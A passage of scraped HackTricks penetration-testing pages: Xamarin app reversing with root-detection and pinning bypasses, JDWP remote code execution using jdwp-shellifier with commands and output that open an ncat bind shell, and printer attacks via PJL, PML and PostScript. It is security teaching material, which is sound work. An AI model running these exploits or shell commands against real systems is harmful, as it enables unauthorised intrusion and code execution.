compilation affects how the application code is shipped within the apk or the ipa file. Let us quickly take a look at it below:\n-\nAndroid\n: Xamarin allows you to compile using\nboth the JIT and the AOT flags for android\n. There is also a way to go in between to get the most speed of execution using the Hybrid AOT mode. Note that the Full AOT mode is available only for the Enterprise license.\n-\niOS\n: There is only one option in the case of iOS,\nahead-of-time compilation\n. This is due to Apple's policies which prohibit the execution of dynamically generated code on a device.\nIf you encounter a Full AOT compiled application, and if the IL Assembly files are removed to reduce the build size by the developer, then the reversing requires an extra step of extracting dll files from .dll.so files from the lib folder or from the\nlibmonodroid_bundle_app.so\nfile. If it is a Hybrid AOT compiled app, and the IL files are still kept in the app bundle, we can use that to reverse engineer the application.\nGetting the dll files from the APK/IPA\nJust\nunzip the apk/ipa\nfile and copy all the files present under the assemblies directory:\nIn case of Android\nAPKs these dll files are compressed\nand cannot be directly used for decompilation. Luckily there are tools out there that we can use to\nuncompress these dll files\nlike\nXamAsmUnZ\nand\nxamarin-decompress\n.\npython3 xamarin-decompress.py -o /path/to/decompressed/apk\nIt is possible instead of dll files you will see\nassemblies.blob\nand\nassemblies.manifest\nin the assemblies directory. This is a Xamarin AssemblyStore and the currently recommended way to pack dlls in an Android application. The\nassemblies.manifest\nis a text file describing the contents of the binary file\nassemblies.blob\n. To unpack these you will need use\npyxamstore\n.\npyxamstore unpack -d /path/to/decompressed/apk/assemblies/\nIn the case of the iOS,\ndll files inside the IPA files can be directly loaded\ninto a decompiler (no need to uncompress anything).\nMost of the application code can be found when we decompile the dll files.\nAlso note that Xamarin Framework based apps contain 90% of common code in the builds of all platforms like iOS and Android etc.\nFrom the above screenshot of listing the dll files that were present in the apk, we can confirm that it is a Xamarin app. It contains app-specific dll files along with the library files that are required for the app to run, such as\nXamarin.Essentails.dll\nor\nMono.Security.dll\n.\nFinally you can use\nthese recommended tools\nto access the\nC# code\nfrom the DLLs.\nDynamic Analysis\nTry to check if the application has any kind of SSL pinning in place. If not, using Burp as a system, CA should work for intercepting requests.\nFrida with Java or ObjC runtime won‚Äôt work\nhere, but luckily there‚Äôs a tool out there that can be used for hooking into methods.\n‚Äã\nFridax\nallows you to easily\nmodify the .NET binary inside a Xamarin application on runtime\n. Static analysis will help you identify different methods present within the application, which can be hooked later for dynamic analysis using Fridax. Below are a few Frida scripts that can help us bypass root detection or SSL-pinning:\n‚Äã\nxamarin-antiroot\n‚Äã\n‚Äã\nxamarin-root-detect-bypass\n‚Äã\n‚Äã\nFrida-xamarin-unpin\n‚Äã\nReferences\n‚Äã\nhttps://www.appknox.com/security/xamarin-reverse-engineering-a-guide-for-penetration-testers\n‚Äã\n‚Äã\nhttps://thecobraden.com/posts/unpacking_xamarin_assembly_stores/\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nMobile Pentesting -\nPrevious\nCordova Apps\nNext\n- Network Services Pentesting\nPentesting JDWP - Java Debug Wire Protocol\nLast modified\n2mo ago"
    },
    {
        "title": "Pentesting JDWP - Java Debug Wire Protocol",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol",
        "text": "Pentesting JDWP - Java Debug Wire Protocol\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nExploiting\nYou can use the python exploit located in\nhttps://github.com/IOActive/jdwp-shellifier\n‚Äã\n./jdwp-shellifier.py\n-t\n192.168\n.2.9\n-p\n8000\n#Obtain internal data\n./jdwp-shellifier.py\n-t\n192.168\n.2.9\n-p\n8000\n--cmd\n'ncat -l -p 1337 -e /bin/bash'\n#Exec something\n./jdwp-shellifier.py\n-t\n192.168\n.2.9\n-p\n8000\n--break-on\n'java.lang.String.indexOf'\n--cmd\n'ncat -l -p 1337 -e /bin/bash'\n#Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept\nI found that the use of\n--break-on 'java.lang.String.indexOf'\nmake the exploit more\nstable\n. And if you have the change to upload a backdoor to the host and execute it instead of executing a command, the exploit will be even more stable.\nNormally this debugger is run on port 8000 and if you establish a TCP connection with the port and send \"\nJDWP-Handshake\n\", the server should respond you with the same string.\nAlso, you can check this string in the network to find possible JDWP services.\nListing\nprocesses\n, if you find the string \"\njdwk\n\" inside a\njava process\n, probably it has active the **Java Debug Wired Protocol **and you may be able to move laterally or even\nescalate privileges\n(if executed as root).\nMore details\nCopied from\nhttps://ioactive.com/hacking-java-debug-wire-protocol-or-how/\n‚Äã\nJava Debug Wire Protocol\nJava Platform Debug Architecture (JPDA)\n: JDWP is one component of the global Java debugging system, called the Java Platform Debug Architecture (JPDA)[2]. The following is a diagram of the overall architecture:\n‚Äã\n‚Äã\n‚Äã\n‚Äã\nThe Debuggee consists of a multi-threaded JVM running our target application. In order to be remotely debuggable, the JVM instance must be explicitly started with the option -Xdebug passed on the command line, as well as the option -Xrunjdwp (or -agentlib). For example, starting a Tomcat server with remote debugging enabled would look like this:\n‚Äã\n‚Äã\n‚Äã\n‚Äã\nAs shown in the architecture diagram, the Java Debug Wire Protocol is the central link between the Debugger and the JVM instance. Observations about the protocol include:\nIt is a packet-based network binary protocol.\nIt is mostly synchronous. The debugger sends a command over JDWP and expects to receive a reply. However, some commands, like Events, do not expect a synchronous response. They will send a reply when specific conditions are met. For example, a BreakPoint is an Event.\nIt does not use authentication.\nIt does not use encryption.\nAll of these observations make total sense since we are talking about a debugging protocol. However, when such a service is exposed to a hostile network, or is Internet facing, things could go wrong.\nHandshake\n: JDWP dictates[9] that communication must be initiated by a simple handshake. Upon successful TCP connection, the Debugger (client) sends the 14-character ASCII string ‚ÄúJDWP-Handshake‚Äù. The Debuggee (server) responds to this message by sending the exact same string. The following scapy[3] trace shows the initial two-way handshake:\nroot:~/tools/scapy-hg # ip addr show dev eth0 | grep ‚Äúinet ‚Äú inet 192.168.2.2/24 brd 192.168.2.255 scope global eth0root:~/tools/scapy-hg # ./run_scapy\nWelcome to Scapy (2.2.0-dev)\n>>>\nsniff(filter=‚Äùtcp port 8000 and host 192.168.2.9‚Ä≥, count=8)\n<Sniffed: TCP:9 UDP:1 ICMP:0 Other:0>\n>>>\ntcp.hexraw()\n0000 15:49:30.397814 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 S\n0001 15:49:30.402445 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 SA\n0002 15:49:30.402508 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 A\n0003 15:49:30.402601 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 PA / Raw\n0000 4A 44 57 50 2D 48 61 6E 64 73 68 61 6B 65 JDWP-Handshake\n0004 15:49:30.407553 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 A\n0005 15:49:30.407557 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 A\n0006 15:49:30.407557 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 PA / Raw\n0000 4A 44 57 50 2D 48 61 6E 64 73 68 61 6B 65 JDWP-Handshake\n0007 15:49:30.407636 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 A\nAn experienced security auditor may have already realised that such a simple handshake offers a way to easily uncover live JDWP services on the Internet. Just send one simple probe and check for the specific response. More interestingly, a behavior was observed on the IBM Java Development Kit when scanning with ShodanHQ[4] with the server ‚Äútalking‚Äù first with the very same banner mentioned. As a consequence, there is a totally passive way to discover an active JDWP service (this is covered later on in this article with the help of the (in)famous Shodan).\nCommunication\n: JDWP defines messages[10] involved in communications between the Debugger and the Debuggee. The messages follow a simple structure, defined as follows:\nThe Length and Id fields are rather self explanatory. The Flag field is only used to distinguish request packets from replies, a value of 0x80 indicating a reply packet. The CommandSet field defines the category of the Command as shown in the following table.\n\\\nCommandSet\n** Command**\n0x40\nAction to be taken by the JVM (e.g. setting a BreakPoint)\n0x40‚Äì0x7F\nProvide event information to the debugger (e.g. the JVM has hit a BreakPoint and is waiting for further actions)\n0x80\nThird-party extensions\nKeeping in mind that we want to execute arbitrary code, the following commands are the most interesting for our purposes.\nVirtualMachine/IDSizes defines the size of the data structures handled by the JVM. This is one of the reasons why the nmap script jdwp-exec.nse[11] does not work, since the script uses hardcoded sizes.\nClassType/InvokeMethod allows you to invoke a static function.\nObjectReference/InvokeMethod allows you to invoke a function from an instantiated object in the JVM.\nStackFrame/(Get|Set)Values provides pushing/popping capabilities from threads stack.\nEvent/Composite forces the JVM to react to specific behaviors declared by this command. This command is a major key for debugging purposes as it allows, among many other things, setting breakpoints, single-stepping through the threads during runtime, and being notified when accessing/modifying values in the exact same manner as GDB or WinDBG.\nNot only does JDWP allow you to access and invoke objects already residing in memory, it also allows you to create or overwrite data.\nVirtualMachine/CreateString allows you to transform a string into a java.lang.String living in the JVM runtime.\nVirtualMachine/RedefineClasses allows you to install new class definitions.\n‚ÄúAll your JDWP are belong to us‚Äù\nAs we have seen, JDWP provides built-in commands to load arbitrary classes into the JVM memory and invoke already existing and/or newly loaded bytecode. The following section will cover the steps for creating exploitation code in Python, which behaves as a partial implementation of a JDI front end in order to be as reliable as possible. The main reason for this standalone exploit script is that, as a pentester, I like ‚Äúhead-shot‚Äù exploits. That is, when I know for sure an environment/application/protocol is vulnerable, I want to have my tool ready to exploit it right away (i.e. no PoC, which is basically the only thing that existed so far). So now that we have covered the theory, let‚Äôs get into the practical implementation. When faced with an open JDWP service, arbitrary command execution is exactly five steps away (or with this exploit, only one command line away). Here is how it would go down: 1. Fetch Java Runtime referenceThe JVM manipulates objects through their references. For this reason, our exploit must first obtain the reference to the java.lang.Runtime class. From this class, we need the reference to the getRuntime() method. This is performed by fetching all classes (AllClasses packet) and all methods in the class we are looking for (ReferenceType/Methods packet). 2. Setup breakpoint and wait for notification (asynchronous calls)This is the key to our exploit. To invoke arbitrary code, we need to be in a running thread context. To do so, a hack is to setup a breakpoint on a method which is known to be called at runtime. As seen earlier, a breakpoint in JDI is an asynchronous event whose type is set to BREAKPOINT(0x02). When hit, the JVM sends an EventData packet to our debugger, containing our breakpoint ID, and more importantly, the reference to the thread which hit it.\nIt is therefore a good idea to set it on a frequently called method, such as java.net.ServerSocket.accept(), which is very likely to be called every time the server receives a new network connection. However, one must bear in mind that it could be any method existing at runtime. 3. Allocating a Java String object in Runtime to carry out the payloadWe will execute code in the JVM runtime, so all of our manipulated data (such as string) must exist in the JVM runtime (i.e. possess an runtime reference). This is done quite easily by sending a CreateString command.\n4. Get Runtime object from breakpoint contextAt this point we have almost all of the elements we need for a successful, reliable exploitation. What we are missing is a Runtime object reference. Obtaining it is easy, and we can simply execute in the JVM runtime the java.lang.Runtime.getRuntime() static method[8] by sending a ClassType/InvokeMethod packet and providing the Runtime class and thread references. 5. Lookup and invoke exec() method in Runtime instanceThe final step is simply looking for the exec() method in the Runtime static object obtained for the previous step and invoking it (by sending a ObjectReference/InvokeMethod packet) with the String object we created in step three.\nEt voil√† !! Swift and easy. As a demonstration, let‚Äôs start a Tomcat running with JPDA ‚Äúdebug mode‚Äù enabled:\nroot@pwnbox:~/apache-tomcat-6.0.39# ./bin/catalina.sh jpda start\nWe execute our script without a command to execute, to simply get general system information:\nhugsy:~/labs % python2 jdwp-shellifier.py -t 192.168.2.9\n[+] Targeting ‚Äò192.168.2.9:8000‚Äô\n[+] Reading settings for ‚ÄòJava HotSpot(TM) 64-Bit Server VM ‚Äì 1.6.0_65‚Äô\n[+] Found Runtime class: id=466[+] Found Runtime.getRuntime(): id=7facdb6a8038\n[+] Created break event id=2\n[+] Waiting for an event on ‚Äòjava.net.ServerSocket.accept‚Äô## Here we wait for breakpoint to be triggered by a new connection ##\n[+] Received matching event from thread 0x8b0\n[+] Found Operating System ‚ÄòMac OS X‚Äô\n[+] Found User name ‚Äòpentestosx‚Äô\n[+] Found ClassPath ‚Äò/Users/pentestosx/Desktop/apache-tomcat-6.0.39/bin/bootstrap.jar‚Äô\n[+] Found User home directory ‚Äò/Users/pentestosx‚Äô\n[!] Command successfully executed\nSame command line, but against a Windows system and breaking on a totally different method:\nhugsy:~/labs % python2 jdwp-shellifier.py -t 192.168.2.8 ‚Äìbreak-on ‚Äòjava.lang.String.indexOf‚Äô\n[+] Targeting ‚Äò192.168.2.8:8000‚Äô\n[+] Reading settings for ‚ÄòJava HotSpot(TM) Client VM ‚Äì 1.7.0_51‚Äô\n[+] Found Runtime class: id=593\n[+] Found Runtime.getRuntime(): id=17977a9c\n[+] Created break event id=2\n[+] Waiting for an event on ‚Äòjava.lang.String.indexOf‚Äô\n[+] Received matching event from thread 0x8f5\n[+] Found Operating System ‚ÄòWindows 7‚Äô\n[+] Found User name ‚Äòhugsy‚Äô\n[+] Found ClassPath ‚ÄòC:UsershugsyDesktopapache-tomcat-6.0.39binbootstrap.jar‚Äô\n[+] Found User home directory ‚ÄòC:Usershugsy‚Äô\n[!] Command successfully executed\nWe execute our exploit to spawn a bind shell with the payload ‚Äúncat -e /bin/bash -l -p 1337‚Äù, against a Linux system:\nhugsy:~/labs % python2 jdwp-shellifier.py -t 192.168.2.8 ‚Äìcmd ‚Äòncat -l -p 1337 -e /bin/bash‚Äô\n[+] Targeting ‚Äò192.168.2.8:8000‚Äô\n[+] Reading settings for ‚ÄòOpenJDK Client VM ‚Äì 1.6.0_27‚Äô\n[+] Found Runtime class: id=79d\n[+] Found Runtime.getRuntime(): id=8a1f5e0\n[+] Created break event id=2\n[+] Waiting for an event on ‚Äòjava.net.ServerSocket.accept‚Äô\n[+] Received matching event from thread 0x82a[+] Selected payload ‚Äòncat -l -p 1337 -e /bin/bash‚Äô\n[+] Command string object created id:82b\n[+] Runtime.getRuntime() returned context id:0x82c\n[+] found Runtime.exec(): id=8a1f5fc[+] Runtime.exec() successful, retId=82d\n[!] Command successfully executed Success, we now have a listening socket!\nroot@pwnbox:~/apache-tomcat-6.0.39# netstat -ntpl | grep 1337\ntcp        0      0 0.0.0.0:1337         0.0.0.0:*               LISTEN      19242/ncat\ntcp6       0      0 :::1337              :::*                    LISTEN      19242/ncat\nThe final exploit uses those techniques, adds a few checks, and sends suspend/resume signals to cause as little disruption as possible (it‚Äôs always best not to break the application you‚Äôre working on, right?). It acts in two modes:\n‚ÄúDefault‚Äù mode is totally non intrusive and simply executes Java code to get local system information (perfect for a PoC to a client).\nPassing the ‚Äúcmd‚Äù option executes a system command on the remote host and is therefore more intrusive. The command is done with the privileges the JVM is running with.\nThis exploit script was successfully tested against:\nOracle Java JDK 1.6 and 1.7\nOpenJDK 1.6\nIBM JDK 1.6\nAs Java is platform-independent by design, commands can be executed on any operating system that Java supports. Well this is actually good news for us pentesters:\nopen JDWP service means reliable RCE\n. So far, so good.\nWhat about real-life exploitation?\nAs a matter of fact, JDWP is used quite a lot in the Java application world. Pentesters might, however, not see it that often when performing remote assessments as firewalls would (and should) mostly block the port it is running on. But this does not mean that JDWP cannot be found in the wild:\nAt the time of writing this article, a quick search on ShodanHQ[4] immediately reveals about 40 servers sending the JDWP handshake:\nThis is actually an interesting finding because, as we‚Äôve seen before, it is supposed to be the client-side (debugger) that initiates dialogue.\nGitHub[7] also reveals a significant number of potentially vulnerable open-source applications:\nmasscan-ing the Internet looking for specific ports (tcp/8000, tcp/8080, tcp/8787, tcp/5005) revealed many hosts (which cannot be reported here) responding to the initial handshake.\n‚ÄúEnterprise‚Äù applications were found in the wild running a JDWP service *by default* (finding the actual port number is left as an exercise to the curious reader).\nThese are just a few ways to discover open JDWP services on the Internet. This is a great reminder that applications should regularly undergo thorough security reviews, production environments should have any debugging functionality turned off, and firewalls should be configured to restrict access to services required for normal operation only. Allowing anybody to connect to a JDWP service is exactly the same as allowing a connection to a gdbserver service (in what may be a more stable way). I hope you enjoyed reading this article as much as I enjoyed playing with JDWP. To y‚Äôall mighty pirates, happy JDWP pwning !!\nThanks\nI would like to thank Ilja Van Sprundel and Sebastien Macke for their ideas and tests.\nReferences:\n1.\n‚Äã\nhttps://github.com/IOActive/jdwp-shellifier\n‚Äã\n2.\n‚Äã\nhttp://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html\n‚Äã\n3.\nhttp://www.secdev.org/projects/scapy(no longer active)\n4.\n‚Äã\nhttp://www.shodanhq.com/search?q=JDWP-HANDSHAKE\n‚Äã\n5.\nhttp://www.hsc-news.com/archives/2013/000109.html (no longer active)\n6.\n‚Äã\nhttp://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt\n‚Äã\n7.\nhttps://github.com/search?q=-Xdebug+-Xrunjdwp&type=Code&ref=searchresults\n8.\n‚Äã\nhttp://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html\n‚Äã\n9.\n‚Äã\nhttp://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html\n‚Äã\n10.\n‚Äã\nhttp://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html\n‚Äã\n11.\n‚Äã\nhttp://nmap.org/nsedoc/scripts/jdwp-exec.html\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nMobile Pentesting -\nPrevious\nXamarin Apps\nNext\n- Network Services Pentesting\nPentesting Printers\nLast modified\n2mo ago"
    },
    {
        "title": "Pentesting Printers",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-printers",
        "text": "Pentesting Printers\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPlease, note that\nmost of the content of all the info related to _Pentesting Printers\n_** ** was taken\nfrom\nthe\nhuge\nand\namazing research\nyou can find on\nhttp://hacking-printers.net/\n. I tried to\nsummarise\nthat information here but you can always\ngo to the source to learn more about the topic\n.\nFundamentals\nA schematic relationship regarding the encapsulation of printer languages is given below:\\\nEncapsulation of printer languages\nNetwork printing protocols\nSending data\nto a printer device can be done by\nUSB/parallel cable\nor over a\nnetwork\n. This wiki focuses on network printing but most of the presented attacks can also be performed against local printers. There are various exotic protocols for network printing like Novell's\nNCP\nor\nAppleTalk\n. In the Windows world,\nSMB/CIFS\nprinter shares have become quite popular. Furthermore, some devices support printing over generic protocols such as\nFTP\nor\nHTTP\nfile uploads. The\nmost common printing protocols\nsupported directly by\nnetwork\nprinters however are\nLPD\n, _IPP\n**, and **\nraw port 9100\n_ printing.\nNetwork printing protocols can be attacked directly\n, for example by exploiting a buffer overflow in the printer's LPD daemon. In many attack scenarios however, they only act as a\ncarrier/channel\nto\ndeploy malicious Printer language code\n. Note that a\nnetwork printer usually supports multiple protocols to ‚Äòprint‚Äô\na document which broadens the attack surface.\nLearn more about\nraw port 9100 here\n.\nLearn more about\nLPD in Pentesting 515 here\n.\nLearn more about\nIPP in Petesting 631 here\n.\nPrinter Control Languages\nA job control language manages settings like output trays for the current print job. While it usually sits as an optional layer in-between the printing protocol and the page description language, functions may be overlapping. Examples of vendor-specific job control languages are\nCPCA\n,\nXJCL\n,\nEJL\nand\nPJL\n‚Äì which is supported by a variety of printers and will be discussed below. In addition,\nprinter control and management languages\nare designed to\naffect\nnot only a single print job but the\ndevice\nas a\nwhole\n. One approach to define a common standard for this task was\nNPAP\n. However, it has not established itself and is only supported by Lexmark. Other printer manufacturers instead use SNMP or its\nPJL-based\nmetalanguage\nPML\n.\nPJL\nThe Printer Job Language (PJL) was originally introduced by HP but soon became a de facto standard for print job control. ‚ÄòPJL resides above other printer languages‚Äô and can be used to change settings like paper tray or size. It must however be pointed out that\nPJL is not limited to the current print job as some settings can be made permanent\n. PJL can also be used to\nchange the printer's display or read/write files on the device\n. There are many dialects as vendors tend to support only a subset of the commands listed in the PJL reference and instead prefer to add proprietary ones.\nPJL is further used to set the file format of the actual print data to follow\n. Without such explicit language switching, the printer has to identify the page description language based on magic numbers. Typical PJL commands to set the paper size and the number of copies before switching the interpreter to PostScript mode are shown below:\n@PJL SET PAPER=A4\n@PJL SET COPIES=10\n@PJL ENTER LANGUAGE=POSTSCRIPT\nInside the\npage about port 9100 'raw port'\nyou can find more information about\nhow to enumerate PJL\n.\nPML\nThe\nPrinter Management Language\n(PML) is a proprietary language to control\nHP printers\n. It basically\ncombines\nthe features of\nSNMP\nwith PJL\n. Publicly available documentation has not been released, however parts of the standard were leaked by the\nLPRng\nproject: the\nPJL Passthrough to PML and SNMP User‚Äôs Guide\ndefines defines PML as ‚Äòan object-oriented request-reply printer management protocol‚Äô and gives an introduction to the basics of the syntax. PML is embedded within PJL and\ncan be used to read and set SNMP values on a printer device\n. This is especially\ninteresting\nif a\nfirewall blocks\naccess to\nSNMP\nservices (161/udp). The use of PML within a print job retrieving the\nhrDeviceDescr\nvalue (OID 1.3.6.1.2.1.25.3.2.1.3, textual description of a device) is demonstrated below:\n> @PJL DMINFO ASCIIHEX=\"000006030302010301\"\n< \"8000000603030201030114106870204c617365724a65742034323530\nThe rear part of string responded by the printer,\n6870204c617365724a65742034323530\nis hexadecimal for\nhp LaserJet 4250\n. As can be seen, it is possible to\ninvoke\n(a subset of)\nSNMP\ncommands over PJL via PML\n. A security-sensitive use of PML is to\nreset HP printers to factory defaults\nvia ordinary print jobs, therefore removing protection mechanisms like user-set passwords.\nUEL\nThe Universal Exit Language (UEL) actually is\nnot a real job control ‚Äòlanguage‚Äô but a single command used to terminate the current data stream\n: the escape character (\n\\x1b\n), followed by\n%-12345X\n. It was originally introduced with HP's PCL and is\nsupported by most modern laser printers\n. A good practice of ‚Äòprinter drivers‚Äô is to invoke the UEL at the beginning and at the end of each print job, so interpretation of the printer language is stopped/restarted and each job has its own, separate environment as shown below:\n\\x1b%-12345X\n@PJL SET PAPER=A4\n@PJL ENTER LANGUAGE=PCL\n...\n[PCL datastream]\n...\n\\x1b%-12345X\nOtherwise, for example PJL settings like paper media size or PostScript definitions set in one print job would influence the next job.\nUEL can be handy to string together multiple jobs into a single file/datastream sent to the printer\n. This can be used to fool\nhardware page counters\nor to switch the printing language in advances\ncross-site printing attacks\n.\nPage Description Languages\nA\npage description language\n(PDL) specifies the\nappearance of the actual document\n. It must however be pointed out that some PDLs offer limited job control, so\na clear demarcation between page description and printer/job control language is not always possible\n. The function of a ‚Äòprinter driver‚Äô is to\ntranslate\nthe\nfile\nto be\nprinted\ninto a\nPDL\nthat is\nunderstood\nby the printer model. Note that some low cost inkjet printers do not support any high level page description language at all. So called host-based or\nGDI\nprinters only accept simple bitmap datastreams like\nZJS\nwhile the actual rendering is done by the printer driver. There are various proprietary page description languages like Kyocera's\nPRESCRIBE\n,\nSPL\n,\nXES\n,\nCaPSL\n,\nRPCS\n,\nESC/P\nwhich is mostly used in dot matrix printers or\nHP-GL\nand\nHP-GL/2\nwhich have been designed for plotters. Support for direct\nPDF\nand\nXPS\nprinting is also common on newer printers.\nThe most common ‚Äòstandard‚Äô page description languages however are PostScript and PCL.\nPostScript (PS)\nThe term ‚Äòpage description‚Äô may be misleading though, as\nPostScript is capable of much more than just creating vector graphics\n. PostScript is a stack-based,\nTuring-complete\nprogramming language consisting of almost 400 operators for arithmetics, stack and graphic manipulation and various data types such as arrays or dictionaries and was created by Adobe.\nTechnically spoken, access to a PostScript interpreter can already be classified as\ncode execution\nbecause any algorithmic function can theoretically be implemented in PostScript. Certainly, without access to the network stack or additional operating system libraries, possibilities are limited to arbitrary mathematical calculations like mining bitcoins. However, PostScript is capable of basic file system I/O to store frequently used code, graphics or font files.\nOriginally designed as a feature, the dangers of such functionality\nwere limited\nbefore printers got interconnected and risks were mainly discussed in the context of host-based PostScript interpreters. In this regard, Encapsulated PostScript (EPS) is also noteworthy as it can be included in other file formats to be interpreted on the host such as\nLaTeX\ndocuments. Like\nPJL\nand\nPCL\n,\nPostScript\nsupports\nbidirectional communication\nbeen host and printer.\nExample PostScript code to echo Hello world to stdout is given below:\n%!\n(Hello world) print\nBrother and Kyocera use their own PostScript clones:\nBr-Script\nand\nKPDL\n. Such flavours of the PostScript language are not 100% compatible, especially concerning security features like exiting the server loop. PostScript can be used for a variety of attacks such as\ndenial of service\n(for example, through infinite loops), print job\nmanipulation\nand\nretention\nas well as gaining access to the printer's\nfile system\n.\nExiting the server loop\nNormally, each print job is encapsulated in its own, separate environment. One interesting feature of\nPostScript\nis that a program\ncan circumvent print job encapsulation\nand alter the initial VM for subsequent jobs. To do so, it can use either startjob, a Level 2 feature:\ntrue 0 startjob\nor exitserver (available in all implementations that include a job server):\nserverdict begin 0 exitserver\nThis capability is controlled by the StartJobPassword which defaults to\n0\n(compare credential disclosure). Since the job server loop is generally responsible for cleaning up the state of the interpreter between jobs,\nany changes that are made outside the server loop will remain as part of the permanent state of the interpreter for all subsequent jobs\n. In other words, a print job can access and alter further jobs. Bingo!\nOperator redefinition\nWhen a\nPostScript\ndocument\ncalls\nan\noperator\n, the\nfirst version found\non the dictionary stack is used. Operators usually reside in the systemdict dictionary, however by placing a new version into the userdict dictionary, operators can be practically overwritten because\nthe user-defined version is the first one found on the dictionary stack\n. Using the startjob/exitserver operators, such changes can be made permanent ‚Äì at least until the printer is restarted. A scheme of the PostScript dictionary stack is given below:\n‚Äã\n‚Äã\n‚Äã\nThe\npotential impact of redefining operators\nis only limited by creativity. When further legitimate documents are printed and call a redefined operator, the attackers version will be executed. This can lead to a various attacks such as\ndenial of service\n, print job\nretention\nand\nmanipulation\n. Note however that this is not necessarily a security bug, but a 32 years old language feature, available in almost any PostScript printer and\nRIP\n.\nPCL\nPCL 3 and PCL 4 added support for fonts and macros which both can be permanently downloaded to the device ‚Äì however only referenced to by a numeric id, not by a file name, as\ndirect access to the file system is not intended\n. PCL 1 to 5 consist of escape sequences followed by one or more ASCII characters representing a command to be interpreted. PCL 6 Enhanced or ‚ÄòPCL XL‚Äô uses a binary encoded, object-oriented protocol. An\nexample PCL document to print ‚ÄòHello world‚Äô is given below\n:\n<Esc>Hello world\nDue to its limited capabilities, PCL is\nhard to exploit\nfrom a security perspective unless one discovers interesting proprietary commands in some printer manufacturers's PCL flavour. The\nPRET\ntool implements a\nvirtual, PCL-based file system\nwhich uses macros to\nsave file content and metadata in the printer's memory\n. This hack shows that even a device which supports only minimalist page description languages like PCL can be used to store arbitrary files like copyright infringing material. Although turning a printer into a file sharing service is not a security vulnerability per se, it may apply as ‚Äòmisuse of service‚Äô depending on the corporate policy.\nMisc Attacks\nUSB drive or cable\nData can be sent to and received from a local printer by\nUSB\nor\nparallel\ncables. Both channels are supported by\nPRET\nto communicate with the device. In addition, printers and MFPs often ship with Type-A USB ports which allows users to print directly from an USB device.\nWhile plugged-in USB drives do\nnot offer a bidirectional channel\n, their usage in a crowded copy room may seem less conspicuous. Obviously, exploiting USB printers requires the attacker to gain physical access to the device. However, it is not completely unrealistic for most institutions and companies. Gaining physical access to printer can generally be considered as less hard than it is for other network components like servers or workstations.\nCross-site printing\nAbusing\nclient web request\nan attacker can\nabuse arbitrary printers\ninside the internal network of the client connected to his malicious web page.\nLearn how can this be possible here.\n‚Äã\nAbusing Spooler service in AD\nIf you can find 